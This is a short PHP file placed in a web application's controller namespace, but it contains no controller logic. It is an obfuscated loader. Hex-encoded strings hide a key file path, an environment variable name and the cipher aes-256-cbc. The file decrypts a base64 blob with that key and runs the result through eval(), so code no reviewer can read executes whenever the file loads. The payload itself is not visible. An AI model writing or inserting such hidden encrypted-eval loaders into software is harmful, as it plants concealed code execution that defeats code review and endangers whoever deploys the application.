<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ahysQduA9I+1WACsC417DA==');

$c=base64_decode(

'YLem3ycRyVRkOeuEbEZKomSma/mxtYxy9eOVT2T0RQOWH70+GRPthKgNiROhiz5b7pC4MClpAf42' .
'J9R8h2Ycibe5gcu0JlFrEaUea4bZQKkcUp7oj57oVqYmgPSBDy+OniWmyRUCfrbnJ1tM9POHOTOR' .
'lvmE8bMsyImyXIfG1zZOY423b6NGvq/XUrVhr5GVwg+WKyZUOKk5hTTaN2EkjIuKMVLxnFesjb80' .
'Jy/9Lw+souGEkDssaKQBb4Z9oSKj1+1vVzwb/CNk5YN+nq9tuSrqMdPZEk45CLCAXvsY1KFRniIM' .
'5oYjkjoiFNEzD6QT/eIa6+HjLaS4mEwugn5PtPeBgFh25Wabl7HATSTX7uEXZYG3jj+mtLqEIfNV' .
'22QKmt0svTlU3uYyMMkIxwHVtw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

